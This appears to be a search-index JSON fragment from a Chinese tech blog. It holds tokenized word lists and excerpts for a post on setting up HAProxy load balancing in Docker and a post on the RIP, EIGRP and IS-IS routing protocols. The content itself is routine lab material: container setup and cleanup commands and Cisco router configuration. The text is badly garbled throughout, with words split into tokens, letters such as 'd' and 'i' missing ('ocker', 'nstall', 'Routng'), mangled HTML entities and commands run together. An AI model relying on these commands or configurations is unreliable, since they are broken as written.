"c","'","curl","172.18.12.10","'","#","ocker","exec","-","t","myhaproxy","bash","-","c","'","curl","172.18.12.20","'","#","安装","haproxy","，","并","配置","后端","节点","ocker","exec","-","t","myhaproxy","bash","-","c","'","yum","-","y","nstall","haproxy","-","q","'","ocker","exec","-","t","myhaproxy","bash","-","c","'","systemctl","restart","haproxy","'","ocker","exec","-","t","myhaproxy","bash","-","c","\"","echo","'","serer","web","1","172.18.12.10",":","80","check","'","etchaproxyhaproxy",".","cfg","\"","ocker","exec","-","t","myhaproxy","bash","-","c","\"","echo","'","serer","web","1","172.18.12.20",":","80","check","'","etchaproxyhaproxy",".","cfg","\"","ocker","exec","-","t","myhaproxy","bash","-","c","'","systemctl","restart","haproxy","'","#","测试","echo","\"","等待","服务","加载",".",".",".",".","\"","sleep","3","ocker","exec","-","t","myhaproxy","bash","-","c","\"","echo","'","-","-","-","-","-","-","-","-","-","-","-","-","-","负载","均衡","演示","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","'","&","amp",";","&","amp",";","for","n","&","#","123",";","1",".",".","10","&","#","125",";",";","o","curl","172.18.12.30",":","5000",";","one","\"","#","净化","检测","命令","echo","\"","-","-","-","-","-","-","-","-","-","-","-","-","开始","删除","配置","-","-","-","-","-","-","-","-","-","-","-","-","\"","ocker","rm","myhaproxy","-","-","forceocker","rm","web","1","web","2","-","-","forceocker","network","rm","mynetecho","\"","-","-","-","-","-","-","-","-","-","-","-","-","检查","是否","有","残留","-","-","-","-","-","-","-","-","-","-","-","-","\"","ocker","network","lsecho","-","e","\"","\"","ocker","ps","-","arm","rootnex",".","html","*","-","rf","负载","均衡","结果","演示"],"url":"http://ymlog.cn/2020/02/17/Docker%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%9E%84%E5%BB%BAHaProxy/","title":"Docker环境下构建HaProxy","content":"Haproxy简介说明\n一款高性能+代理负载均衡软件，目前使用广泛，支持实现TCP/HTTP的负载均衡\n免费开源\n最大并发量能达到5w\n支持多种负载均衡算法，同时支持session\n支持虚拟主机\n拥有服务监控页面，可以了解 系统实时运...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E5%AE%B9%E5%99%A8/","name":"容器"},"date":"2020-02-17 12:27:52"},{"word":["*","简介","路由","协议","可以","分为","静态","路由","协议","和","动态","路由","协议","，","动态","路由","协议","有","两","类","。","一类","是","用于","内部","网路","互联","互通","的","IGP","协议","，","其中","代表","的","有","RIP","、","EIGRP","、","OSPF","、","ISIS","等","，","另一","类","是","用于","区域","与","区域","之间","互通","的","外部","网关","协议","，","目前","只","有","BGP","。","本章","主要","总结","内部","网关","协议","中的","RIP","、","EIGRP","和","ISIS","。","其","中","RIP","和","EIGRP","是","距离","矢量","协议","，","而","ISIS","和","OSPF","同","属于","链路","状态","协议","。","距离","矢量","协议","：","传递","路由","条目","，","网络","能见度","只有","一跳","—","—","基于","Bellman","算法","链路","状态","协议","：","传递","链路","信息","，","网络","能见度","是","整个","拓扑","结构","—","—","基于","SPF","(","Short","Path","Frst",")","，","最","短","路径","算法","RIP","RIP","使用","跳","数","来","描述","一条","路由","的","好坏","，","每","经过","一台","路由器","，","跳","数","加","一","，","当","跳","数","为","16","跳","的","时候","，","这","条","路由","就","会","作废","。","RIP","消息","封装","的","时候","，","使用","UDP","，","端口","号","是","520","，","并且","源","端口","和","目的","端口","都是","520","RIP","迄今为止","有","三个","版本","，","分","别","为","：","RIP","1","，","RIP","2","，","RIPng","，","目前","IP","4","使用","的","是","Verson","2","IPV","6","使用","的","是","Verson","RIPng","。","RIP","在","Csco","设备","的","管理","距离","为","120","RIP","1","RIP","2","使用","广播","更新","路由","表","使用","组","播","更新","路由","表","有","类","路由","协议","无","类","路由","协议","不支持","VLSM","支","持","VLSM","不支持","手工","汇总","支持","手工","汇总","不支持","路由","表","及","Tag","支持","路由","标记","更新","消息","中的","路由","条目","没有","Next","-","hop","信息","有","Next","-","hop","信息","有","类","路由","协议","更新","不","携带","子网掩码","，","所以","RIP","宣告","不能","加","mask","，","如果","宣告","1.1.1.024","，","最后","宣告","的","还是","1.0.0.08","。","RIP","2","使用","的","组","播","地址","为","224.0.0.9","。","RIP","的","消息","通知","机制","：","RIP","默认","30","s","会","从","所有","参与","RIP","的","接口","发出","路由","表","信息","，","当","180","s","没","有","收到","某","条","路由","的","时候","，","就","会","判断","那","条","路由","可能","失效","了","，","但是","依旧","会","放","在","路由","表里","面","，","只是","不会","再","给","别人","了","，","当","240","s","都","没","有","收到","这","条","路由","的","时候","，","就","会","彻底","删除","。","RIP","配置","宣告","RIP","路由","：","router","rp","#","启动","RIP","协议","network","1.0.0.0","#","将","1.0.0.0","加入","到","更新","路由","表","中","，","将","1.0.0.0","所在","接口","也","加入","更新","接口","中","network","192.168.12.0","#","当","宣告","完","之后","，","R","1","就","可以","Png","通","R","4","了","#","修改","RIP","时间","router","rptmers","basc","30","180","180","240","#","分","别","是","Upates","、","Inal","、","Holown","、","Flush","RIP","机制","查看","R","1","的","路由","表",",","可以","发现","去往","R","2","~","R","4","逐跳","递增","：","R","2.0.0.0","&","#","x","2","F",";","8","[","120","&","#","x","2","F",";","1","]","a","192.168.12.2",",","00",":","00",":","27",",","Ethernet","0","&","#","x","2","F",";","0","R","3.0.0.0","&","#","x","2","F",";","8","[","120","&","#","x","2","F",";","2","]","a","192.168.12.2",",","00",":","00",":","27",",","Ethernet","0","&","#","x","2","F",";","0","R","4.0.0.0","&","#","x","2","F",";","8","[","120","&","#","x","2","F",";","3","]","a","192.168.12.2",",","00",":","00",":","06",",","Ethernet","0","&","#","x","2","F",";","0","#","并且","这里","的","时间","也是","正向","计时","，","一","到","30","s","就","重置","。","如果","是","失效","的","路由","条目","，","则","会","经历","180","s","和","240","s","查看","RIP","协议","相关","：","R","1","#","sh","p","protocols","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","Routng","Protocol","s","\"","rp","\"","Outgong","upate","flter","lst","for","all","nterfaces","s","not","set","Incomng","upate","flter","lst","for","all","nterfaces","s","not","set","#","每隔","30","s","发送","一次","更新","消息","，","下一次","预计","在","14","s","之后","。","Senng","upates","eery","30","secons",",","next","ue","n","14","secons","#","180","s","判断","为","own","，","240","删除","无效","Inal","after","180","secons",",","hol","own","180",",","flushe","after","240","Restrbutng",":","rp","#","默认","版本","Default","erson","control",":","sen","erson","2",",","recee","erson","2","#","配置","接口","Interface","Sen","Rec","Trggere","RIP","Key","-","chan","Ethernet","00","2","2","Loopback","0","2","2","Interface","Sen","Rec","Trggere","RIP","Key","-","chan","#","自动","网络","汇总","生效","，","会","将","所有","子网","划分","的","地址","汇总","为主","类","，","主类","就是","子网掩码","按照","ABC","类","来","Automatc","network","summarzaton","s","n","effect","#","最大","负载","均衡","为","4","Maxmum","path",":","4","#","已经","宣告","的","路由","，","这里","也","可以","看出","我们","宣告","的","1.1.1.0","变成","了","1.0.0.0","，","不","加","子网掩码","Routng","for","Networks",":","1.0.0.0","192.168.12.0","#","路由","信息","来源","上","一次","更新","时间","是","累加","的","，","到","30","s","刷新","，","和","上面","的","预计","14","s","形成","呼应","Routng","Informaton","Sources",":","Gateway","Dstance","Last","Upate","#","16","s","之前","更新","过","192.168.12.2","120","00",":","00",":","16","#","默认","管理","距离","为","120","Dstance",":","(","efault","s","120",")","关于","RIP","的","30","s","、","180","s","、","240","s","，","这里","shutown","了","R","4","的","e","00","接口","，","在","R","3","上","观察","现象","，","之后","R","3","删除","后","，","才","会","反应","到","R","1","上","：","#","R","3","-","-","180","的","ownR","1.0.0.08","[","1202","]","a","192.168.23.2",",","00",":","00",":","21",",","Ethernet","00","R","2.0.0.08","[","1201","]","a","192.168.23.2",",","00",":","00",":","21",",","Ethernet","00","R","4.0.0.08","[","1201","]","a","192.168.34.4",",","00",":","01",":","32",",","Ethernet","01","R","192.168.12.024","[","1201","]","a","192.168.23.2",",","00",":","00",":","21",",","Ethernet","00","#","R","3","-","-","240","s","后","，","R","1","、","R","2","、","R","3","的","4.4.4.0","都","被","删除","了","R","1.0.0.08","[","1202","]","a","192.168.23.2",",","00",":","00",":","16",",","Ethernet","00","R","2.0.0.08","[","1201","]","a","192.168.23.2",",","00",":","00",":","16",",","Ethernet","00","R","4.0.0.08","s","possbly","own",",","routng","a","192.168.34.4",",","Ethernet","01","R","192.168.12.024","[","1201","]","a","192.168.23.2",",","00",":","00",":","16",",","Ethernet","00","RIP","汇总","RIP","的","自动","汇总","功能","总是","打开","的","，","我们","可以","手动","关闭","：","R","1","(","confg","-","router",")","#","no","auto","-","summarynt","lo","1","p","a","172.16.1.1","255.255.255.0","nt","lo","2","p","a","172.16.2.1","255.255.255.0","nt","lo","3","p","a","172.16.3.1","255.255.255.0","router","rpnet","172.16.1.0","net","172.16.2.0","net","172.16.3.0","#","当","完成","这","一切","，","在","R","2","的","路由","表","上","可以","看到","R","172.16.1.0","[","120","&","#","x","2","F",";","1","]","a","192.168.12.1",",","00",":","00",":","02",",","Ethernet","0","&","#","x","2","F",";","0","R","172.16.2.0","[","120","&","#","x","2","F",";","1","]","a","192.168.12.1",",","00",":","00",":","02",",","Ethernet","0","&","#","x","2","F",";","0","R","172.16.3.0","[","120","&","#","x","2","F",";","1","]","a","192.168.12.1",",","00",":","00",":","02",",","Ethernet","0","&","#","x","2","F",";","0","#","现在","在","R","1","的","出","接口","对路","由","进行","汇总","R","1","(","confg",")","#","nt","e","0","&","#","x","2","F",";","0","R","1","(","confg","-","f",")","#","p","summary","-","aress","rp","172.16.0.0","255.255.0.0","#","之后","再看","R","2","的","路由","表","，","就","会","发现","RIP","好","慢","，","明细","路由","还是","要","经历","180","-","240","的","过程","C","：","172.16.0.0","&","#","x","2","F",";","16","s","arably","subnette",",","4","subnets",",","2","masksR","172.16.0.0","&","#","x","2","F",";","16","[","120","&","#","x","2","F",";","1","]","a","192.168.12.1",",","00",":","00",":","22",",","Ethernet","0","&","#","x","2","F",";","0","R","172.16.1.0","&","#","x","2","F",";","24","[","120","&","#","x","2","F",";","1","]","a","192.168.12.1",",","00",":","00",":","52",",","Ethernet","0","&","#","x","2","F",";","0","R","172.16.2.0","&","#","x","2","F",";","24","[","120","&","#","x","2","F",";","1","]","a","192.168.12.1",",","00",":","00",":","52",",","Ethernet","0","&","#","x","2","F",";","0","R","172.16.3.0","&","#","x","2","F",";","24","[","120","&","#","x","2","F",";","1","]","a","192.168.12.1",",","00",":","00",":","52",",","Ethernet","0","&","#","x","2","F",";","0","不得不","介绍","一下","清理","路由","表","的","办法","了","，","RIP","实在","是","太","慢","了","：","clear","p","route","*","。","RIP","认证","R","1","(","confg",")","#","key","chan","Csco","&","#","x","2","F",";","&","#","x","2","F",";","设置","钥匙","的","名字","R","1","(","confg","-","keychan",")","#","key","1","&","#","x","2","F",";","&","#","x","2","F",";","第","一把","钥匙","R","1","(","confg","-","keychan","-","key",")","#","key","-","strng","Csco","1","&","#","x","2","F",";","&","#","x","2","F",";","第","一把","钥匙","的","内容","R","1","(","confg","-","keychan","-","key",")","#","key","2","R","1","(","confg","-","keychan","-","key",")","#","key","-","strng","Csco","2","R","1","(","confg","-","keychan","-","key",")","#","nt","e","0","&","#","x","2","F",";","0","&","#","x","2","F",";","&","#","x","2","F",";","在","接口","上","配置","加密","R","1","(","confg","-","f",")","#","p","rp","authentcaton","key","-","chan","Csco","&","#","x","2","F",";","&","#","x","2","F",";","用","钥匙","Csco","给","RIP","的","加密","R","1","(","confg","-","f",")","#","p","rp","authentcaton","moe","m","5","&","#","x","2","F",";","&","#","x","2","F",";","加密","格式","为","m","5","，","也","可以","明文","加密","当","在","R","1","上","配置","完","认证","之后","，","就","会","发现","R","2","在","R","1","上学","到","的","条目","进入","了","180","-","240","的","过程","。","此时","R","2","已经","不能","学习","到","R","1","的","路由","条目","了","，","除非","在","R","2","上","也","配置","认证","。","Key","-","chan","的","其他","配置","R","2","(","confg","-","keychan","-","key",")","#","?","Key","-","chan","key","confguraton","commans",":","accept","-","lfetme","Set","accept","lfetme","of","key","cryptographc","-","algorthm","Set","cryptographc","authentcaton","algorthm","efault","Set","a","comman","to","ts","efaults","ext","Ext","from","key","-","chan","key","confguraton","moe","key","-","strng","Set","key","strng","no","Negate","a","comman","or","set","ts","efaults","sen","-","lfetme","Set","sen","lfetme","of","key","RIP","防","环","定义","最大","跳","数","，","一个","路由","最远","可以","到","15","跳","的","地方","，","如果","是","16","跳","，","就","会","认为","不可","达","水平","分割","，","如果","从","接口","上","收到","某","条","路由","的","更新","，","那么","就","不会","将","该","路由","再发","回去","毒性","逆转","，","和","水平","分隔","矛盾","，","只","能","二","选","一","，","如果","从","接口","上","收到","某","路由","的","更新","，","那么","就","立即","从","收到","的","接口","将","该","路由","发","回去","，","但是","跳","数","是","16","，","这样","就","不会","从","这个","方向","去","学习","路由","了","。","毒性","路由","，","如果","某个","接口","own","了","，","就","会","立即","更新","该","接口","的","网段","，","但是","跳","数","是","16","，","这样","邻居","收到","后","就","立即","删除","抑制","计时器","，","180","s","没有","收到","路由","更新","就","会","判断","可能","失效","，","240","s","没有","收到","就","会","直接","删除","触发","更新","，","如果","路由","发生","了","变化","，","立即","进行","更新","而","不用","等待","30","s","毒性","路由","实验","：","shutownR","4","的","lo","0","接口","，","然后","在","R","3","上","观察","现象","#","R","3","R","1.0.0.0","&","#","x","2","F",";","8","[","120","&","#","x","2","F",";","2","]","a","192.168.23.2",",","00",":","00",":","01",",","Ethernet","0","&","#","x","2","F",";","0","R","2.0.0.0","&","#","x","2","F",";","8","[","120","&","#","x","2","F",";","1","]","a","192.168.23.2",",","00",":","00",":","01",",","Ethernet","0","&","#","x","2","F",";","0","R","4.0.0.0","&","#","x","2","F",";","8","[","120","&","#","x","2","F",";","1","]","a","192.168.34.4",",","00",":","00",":","18",",","Ethernet","0","&","#","x","2","F",";","1","R","4","(","confg","-","f",")","#","shutownR","1.0.0.0","&","#","x","2","F",";","8","[","120","&","#","x","2","F",";","2","]","a","192.168.23.2",",","00",":","00",":","02",",","Ethernet","0","&","#","x","2","F",";","0","R","2.0.0.0","&","#","x","2","F",";","8","[","120","&","#","x","2","F",";","1","]","a","192.168.23.2",",","00",":","00",":","02",",","Ethernet","0","&","#","x","2","F",";","0","#","竟然","只用","了","几秒钟","中","就","反应","过来","了","。","RIP","命令","router","rp","#","启动","RIP","协议","erson","2","network","1.1.1.0","#","将","1.0.0.0","加入","到","更新","路由","表","中","，","将","1.0.0.0","所在","接口","也","加入","更新","接口","中","tmers","basc","30","180","180","240","#","分","别","是","Upates","、","Inal","、","Holown","、","Flush","no","auto","-","summary","#","关闭","自动","汇总","#","手动","汇总","(","confg","-","f",")","#","p","summary","-","aress","rp","172.16.0.0","255.255.0.0","认证","配置","：","key","chan","NAME","#","设置","钥匙","的","名字","key","1","#","第","一把","钥匙","key","-","strng","STRING","#","第","一把","钥匙","的","内容","nt","e","0","&","#","x","2","F",";","0","#","在","接口","上","配置","p","rp","authentcaton","key","-","chan","NAME","#","用","钥匙","给","RIP","的","加密","p","rp","authentcaton","moe","m","5","#","加密","格式","为","m","5","，","也","可以","明文","加密","EIGRP","增强","型","内部","网关","路由","选择","协议","(","Enhance","Interor","Gateway","Routng","protocol",",","EIGRP",")","EIGRP","协议","的","特点","：","EIGRP","有","自治","系统","，","一个","EIGRP","网络","，","必须","所有","的","路由器","都","属于","同一个","自治","系统","才","可以","传递","路由","。","EIGRP","使用","DUAL","扩散","更新","算法","来","保障","无","环路","最优","路径","计算","是","无","类","路由","协议","，","每个","路由","条目","都","包含","子网掩码","传输","模块","RTP","（","Relable","Transport","Protocol","）","，","使用","组","播","224.0.0.10","EIGRP","的","非","周期","、","有","边界","、","和","部","分","；","非","周期","：","只","在","度量","和","网络","拓扑","变化","时","才","更新","，","部分","：","只","发送","变化","的","路由","条目","，","有","边界","：","更新","仅","发给","受","影响","的","路由","更新","消息","直接","存放","于","IP","包头","之后","，","所","有没有","传输","层","。","在","IP","包头","协议","字段","中用","88","表示","。","管理","距离","在","Csco","设备","上","有","三种","，","分","别","是","5",",","90",",","170","EIGRP","的","更新","是","可靠","传输","的","，","任何","一个","给","邻居","的","路由","信息","都","必须","得到","邻居","的","确认","。","EIGRP","的","度量","值","(","Metrc",")","计算","会","包含","：","带宽","(","Banwth",")","、","延迟","(","elay",")","、","可靠性","(","relablty",")","、","负载","(","loang",")","、","最大","传输","单元","(","MTU",")","EIGRP","的","数据","报","：","Hello","，","用于","邻居","的","发现","和","恢复","，","Hello","数据","报","使用","组","播","方式","发送","，","而且","使用","不可靠","的","发送","方式","ACK","，","是","不","包含","数据","的","Hello","数据","报","，","ACK","总是","用","单","播","方","、","不可靠","的","发送","方式","Upate","，","传递","路由","更新","信息","，","仅","传递","给","有","需要","的","路由","，","单","台","路由","单","播","发送","，","多","台","路由","组","播","发送","Query","&","amp",";","Reply","，","查询","和","答复","，","是","DUAL","用来","管理","它","的","扩散","计算","的","EIGRP","三","张表","1","、","邻居","表","​","EIGRP","路由器","在","启动","之后","，","就","会","每隔","5秒钟","，","发送","一个","hello","消息","，","且","从","任何","接口","的","222.0.0.10","组","播","地址","收到","hello","，","就","会","立即","将","对方","加入","到","自己","的","邻居","表","​","邻居","表","中的","邻居","都会","有","一个","死亡","事假","你","，","是","3","倍","hello","消息","间隔","，","每次","收到","邻居","的","hello","都会","重置","死亡","计时器","，","死亡","计时器","一旦","到","零","，","就","会","直接","删除","和","这个","邻居","有关","的","一切","路由","信息","。","查看","EIGRP","的","邻居","表","R","1","#","show","p","egrp","neghbors","EIGRP","-","IP","4","Neghbors","for","AS","(","100",")","平均","往返","时间","H","Aress","Interface","Hol","Uptme","SRTT","RTO","Q","Seq","(","sec",")","(","ms",")","Cnt","Num","1","192.168.15.5","Et","01","11","00",":","01",":","03","1280","5000","0","80","192.168.12.2","Et","00","10","00",":","02",":","24","9","100","0","15","Hol","Uptme","：","SRTT","：","平均","往返","时间","RTO","：","重","传","计时","，","基于","SRTTQCnt","：","重","传","队列","SeqNum","：","度量","值","Metrc","计算","2","、","拓扑","表","R","1","#","sh","p","egrp","topology","EIGRP","-","IP","4","Topology","Table","for","AS","(","100",")","ID","(","1.1.1.1",")","Coes",":","P","-","Passe",",","A","-","Acte",",","U","-","Upate",",","Q","-","Query",",","R","-","Reply",",","r","-","reply","Status",",","s","-","sa","Status","P","192.168.23.024",",","1","successors",",","FD","s","307200","a","192.168.12.2","(","307200281600",")",",","Ethernet","00","P","192.168.34.024",",","2","successors",",","FD","s","332800","a","192.168.12.2","(","332800307200",")",",","Ethernet","00","a","192.168.15.5","(","332800307200",")",",","Ethernet","01","P","192.168.12.024",",","1","successors",",","FD","s","281600","a","Connecte",",","Ethernet","00","P","5.5.5.024",",","1","successors",",","FD","s","409600","a","192.168.15.5","(","409600128256",")",",","Ethernet","01","P","192.168.45.024",",","1","successors",",","FD","s","307200","a","192.168.15.5","(","307200281600",")",",","Ethernet","01","P","2.2.2.024",",","1","successors",",","FD","s","409600","a","192.168.12.2","(","409600128256",")",",","Ethernet","00","P","3.3.3.024",",","1","successors",",","FD","s","435200","a","192.168.12.2","(","435200409600",")",",","Ethernet","00","P","192.168.15.024",",","1","successors",",","FD","s","281600","a","Connecte",",","Ethernet","01","P","1.1.1.024",",","1","successors",",","FD","s","128256","a","Connecte",",","Loopback","0","P","4.4.4.024",",","1","successors",",","FD","s","435200","a","192.168.15.5","(","435200409600",")",",","Ethernet","01","#","拓扑","表","中","记录","了","每个","目的地","的","相关","信息","，","比如","后继","路由器","、","可行","后继","路由器","、","可行","距离","、","通告","距离","。","#","FD","：","可行","距离","(","Feasble","Dstance",")",",","到达","目的地","的","最小","度量","值","就是","可行","距离",",","类似","Metrc","#","FC","：","可行性","条件","(","Feasblty","Conton",")","，","邻居","比","自","己","的","FD","小","#","FS","：","可行性","后继","路由器","(","Feasble","Successor",")","，","满足","FC","后","，","这个","邻居","就","会","变成","该","网络","的","可行","后继","路由器","#","通告","距离","：","就是","去往","这个","目的地","的","下","一跳","到","目的地","的","度量","值","，","相当于","邻居","表","到","这个","目的地","的","度量","值","当","拓扑","表","中","最佳","后继","路由器","失效","了","，","会","导致","EIGRP","向","所","有的","邻居","发起","查询","，","并且","会","将","邻居","标记","为","（","q","）","如果","3分钟","内","，","邻居","都","没有","任何","形式","的","回复","，","那么","就","会","主动","断开","和","这个","邻居","的","关系","3","、","EIGRP","路由","表","R","1","#","show","p","route","egrp","2.0.0.024","s","subnette",",","1","subnetsD","2.2.2.0","[","90409600","]","a","192.168.12.2",",","00",":","10",":","49",",","Ethernet","00","3.0.0.024","s","subnette",",","1","subnetsD","3.3.3.0","[","90435200","]","a","192.168.12.2",",","00",":","08",":","41",",","Ethernet","00","4.0.0.024","s","subnette",",","1","subnetsD","4.4.4.0","[","90435200","]","a","192.168.15.5",",","00",":","08",":","41",",","Ethernet","01","5.0.0.024","s","subnette",",","1","subnetsD","5.5.5.0","[","90409600","]","a","192.168.15.5",",","00",":","09",":","29",",","Ethernet","01","D","192.168.23.024","[","90307200","]","a","192.168.12.2",",","00",":","10",":","29",",","Ethernet","00","D","192.168.34.024","[","90332800","]","a","192.168.15.5",",","00",":","08",":","43",",","Ethernet","01","[","90332800","]","a","192.168.12.2",",","00",":","08",":","43",",","Ethernet","00","D","192.168.45.024","[","90307200","]","a","192.168.15.5",",","00",":","09",":","29",",","Ethernet","01","[","ADFD","]","#","egrp","的","管理","距离","内部","路由","：","90","外部","路由","：","170","汇总","路由","：","5","metrc","maxmum","hops","102","修改","最大","跳","数","路由","汇总","–","在","路由","出口","手动","汇总","EIGRP","的","自动","汇总","默认","是","关闭","着","的","，","无论是","手动","汇总","还是","自动","汇总","都会","影响","本地","路由","表","，","这个","条目","管理","距离","为","5","，","并且","吓一跳","距离","为","NULL","0","，","NULL","0","和","loopback","一样","，","都是","软件","模拟","出来","的","接口","，","不过","Loopback","在","通信","过程","中","会","正常","响应","，","而","NULL","0","会","将","数据","直接","丢弃","不会","回复","，","等于","NULL","0","就是","黑洞","。","汇总","的","时候","产生","的","NULL","0","是","为了","尽快","结束","路由","查找","，","因为","汇总","丢失","了","明细","，","所以","当","出现","路由","访问","的","时候","，","明细","路由","应该","优先","形成","匹配","，","如果","明细","路由","没有","被","匹配","上","，","说明","地址","不存在","，","可以","直接","丢弃","。","p","summary","-","aress","egrp","100","172.16.0.0","255.255.0.0","no","auto","-","summary","EIGRP","的","配置","R","1","(","confg","-","f",")","#","router","egrp","100","R","1","(","confg","-","router",")","#","network","192.168.12.0","0.0.0.255","R","1","(","confg","-","router",")","#","network","1.1.1.0","0.0.0.255","EIGRP","是","无","类","路由","，","宣告","加上","通配符","掩码","可以","保留","子网掩码","R","1","(","confg","-","router",")","#","o","sh","run","sec","egrp","router","egrp","100","network","1.1.1.0","0.0.0.255","network","192.168.12.0","banwth","9000","#","设置","带宽","elay","999","#","设置","延迟","EIGRP","的","认证","key","-","chan","配置","和","RIP","一样","，","剩下","的","是","套","在","接口","上","，","这里","我们","配置","R","3","-","R","4","的","EIGRP","认证","R","3","(","confg","-","keychan",")","#","nt","e","01","R","3","(","confg","-","f",")","#","p","authentcaton","key","-","chan","egrp","100","CscoR","3","(","confg","-","f",")","#","p","authentcaton","moe","egrp","100","m","5","把","R","5","任意","接口","own","掉","，","此时","发现","，","R","3","png","R","4","的","e","00","接口","还是","能","png","通","，","我","一度","以为","是","认证","对","EIGRP","无效","，","搞","了","半天","，","才","发现","他们","是","直","连","，","C","。","接着","R","1","pngR","4","就","png","不通","了","。","EIGRP","的","汇总","nt","lo","1","p","a","172.16.1.1","255.255.255.0","nt","lo","2","p","a","172.16.2.1","255.255.255.0","nt","lo","3","p","a","172.16.3.1","255.255.255.0","router","egrp","100","network","172.16.1.0","0.0.0.255","network","172.16.2.0","0.0.0.255","network","172.16.3.0","0.0.0.255","nt","e","00","p","summary","-","aress","egrp","100","172.16.0.0","255.255.0.0","#","EIGRP","默认","开启","自动","汇总","R","5","#","show","p","route","egrp","汇总","前","：","172.16.0.024","s","subnette",",","3","subnets","D","172.16.1.0","[","90409600","]","a","192.168.15.1",",","00",":","01",":","13",",","Ethernet","00","D","172.16.2.0","[","90409600","]","a","192.168.15.1",",","00",":","01",":","13",",","Ethernet","00","D","172.16.3.0","[","90409600","]","a","192.168.15.1",",","00",":","01",":","13",",","Ethernet","00","汇总","后","：","R","2","#","show","p","route","egrp","172.16.0.016","s","arably","subnette",",","4","subnets",",","2","masksD","172.16.0.016","[","90409600","]","a","192.168.12.1",",","00",":","00",":","35",",","Ethernet","00","D","172.16.1.024","[","90486400","]","a","192.168.23.3",",","00",":","00",":","35",",","Ethernet","01","D","172.16.2.024","[","90486400","]","a","192.168.23.3",",","00",":","00",":","35",",","Ethernet","01","D","172.16.3.024","[","90486400","]","a","192.168.23.3",",","00",":","00",":","35",",","Ethernet","01","会","发","现","，","即使","是","汇总","，","和","R","1","相邻","的","路由器","上","也","可以","收到","明细","路由","，","但是","R","3","等","不和","R","1","相邻","的","路由器","上","，","就","只","能","收到","汇总","后","的","路由","。","D","172.16.0.016","[","90435200","]","a","192.168.23.2",",","00",":","00",":","02",",","Ethernet","00","EIGRP","–","FD","值","修改","EIGRP","的","AD","值","和","FD","值","，","可以","通过","掉","接口","的","带","宽和","延迟","做到","。","现在","可以","看到","R","1","去往","34","网段","负载","均衡","，","我们","现在","想","让","R","1","只","从","R","2","走","，","所以","这里","调","高","R","1","的","e","01","接口","的","带","宽和","延迟","，","接口","的","带","宽和","延迟","可以","用","show","nterfaces","e","01","查看","。","#","R","1","路由","表","D","192.168.34.024","[","90332800","]","a","192.168.15.5",",","00",":","00",":","17",",","Ethernet","01","[","90332800","]","a","192.168.12.2",",","00",":","00",":","17",",","Ethernet","00","#","R","1","拓扑","表","P","192.168.34.024",",","2","successors",",","FD","s","332800","a","192.168.12.2","(","332800307200",")",",","Ethernet","00","a","192.168.15.5","(","332800307200",")",",","Ethernet","01","调整","带宽","，","如果","是","在","接口","下","修改","，","可能会","影响","多","条","路径","，","建议","使用","偏移","列表","offset","-","set","。","offset","只能","增加","从","某个","接口","进入","或者","出去","的","路由","R","1","(","confg","-","f",")","#","banwth","5000","再看","拓扑","表","：","#","R","1","P","192.168.34.024",",","1","successors",",","FD","s","332800","a","192.168.12.2","(","332800307200",")",",","Ethernet","00","a","192.168.15.5","(","588800307200",")",",","Ethernet","01","#","R","1","的","路由","表","中","，","也","只","会","选择","从","R","2","走了","调整","时延","类似","：","R","1","(","confg","-","f",")","#","elay","10000","时延","和","带宽","可以","影响","FD","，","影响","EIGRP","度量","值","的","五个","要素","：","带宽","(","Banwth",")","、","延迟","(","elay",")","、","可靠性","(","relablty",")","、","负载","(","loang",")","、","最大","传输","单元","(","MTU",")","。","FD","=","metrc","=","256","*","&","#","123",";","10","^","7","bw","+","elaysum","10","&","#","125",";","ISISISIS","采用","了","面向","无","连接","的","CLNS","协议","，","但","需要","保留","IP","地址","做","ISIS","的","Router","-","ID","。","其","中","CLNP","地址","的","写法","为","：","49.0001.0000.0000.0001.00","49","：","是","标志","地址","的","作用","，","这里","是","私有","地址","的","意思","0001","：","区域","号","0000.0000.0001","：","设备","ID","00","：","端口","号","—","NSEL","简介","ISIS","最早","不是","给","TCPIP","设计","的","，","是","给","CLNS","无","连接","网络","设计","的","，","但是","CLNS","被","淘汰","了","。","ISIS","的","开发者","给","ISIS","协议","加上","了","TCPIP","的","支持","模块","，","将","其","变为","集成","的","ISIS","，","但是","依旧","不如","OSPF","流行","，","所以","渐渐","被","人","遗忘","。","近","年来","云","计算","数据中心","崛起","，","数据中心","网络","日益","复杂","，","而","OSPF","的","区域","划分","很不","自由","，","并且","OSPF","是","基于","IP","来","进行","信息","传递","的","，","而","数据中心","并","不是","完全","的","TCPIP","的","网络","环境","，","所以","OSPF","使用","受到","很大的","限制","。","FC","网络","不允许","浪费","传输","效率","ISIS","在","Csco","设备","中的","管理","距离","为","115","ISIS","配置","router","ss","#","启动","协议","net","49.0001.0000.0000.0001.00","#","宣告","CLNP","地址","nt","e","00",",","lo","0","#","在","接口","下","配置","ISISp","router","ss","ISIS","邻居","R","3","#","show","ss","neghbors","System","I","Type","Interface","IP","Aress","State","Holtme","Crcut","IR","1","L","1","Et","00","192.168.123.1","UP","22","R","3.01","R","1","L","2","Et","00","192.168.123.1","UP","27","R","3.01","R","2","L","1","Et","00","192.168.123.2","UP","22","R","3.01","R","2","L","2","Et","00","192.168.123.2","UP","26","R","3.01","R","4","L","2","Et","01","192.168.34.4","UP","9","R","4.01","ISIS","的","Hello","包","正常","情况","下","，","10","s","一次","，","30","s","没收","到","就","判定","死亡","。","ISIS","有","指定","路由器","的","概念","，","但是","ISIS","的","世界","中","，","路由器","不叫","路由器","，","而","叫","中间","系统","，","所以","DR","就","变成","了","DIS","DIS","的","Hello","包","是","3.3","s","一次","，","10","s","没收","到","就","判定","DIS","死亡","，","剩下","的","路由器","会","重新","选举","一台","路由器","作为","DIS","。","DIS","没有","备份","的","概念","，","谁","都","可以","随时","抢占","。","DIS","会","优先","判定","优先级","，","优先","级","为","0","的","设备","，","依旧","可以","做","DIS","。","DIS","在","优先级","一样","的","情况","下","，","会通","过","比较","MAC","地址","数值","大小","，","越","打","越优","。","ISIS","角色","Leel","-","1","Router","：","区域内","部","路由器","，","用来","在","区域","内部","学习","和","交换","LSP","（","相当于","OSPF","的","LSA","）","L","1","路由器","只","能","和","L","1","或者","L","12","路由器","建立","邻居","L","1","路由器","可以","知道","整个","区域","的","拓扑","，","但是","其他","区域","连","路由","都","学","不到","，","通过","默认","路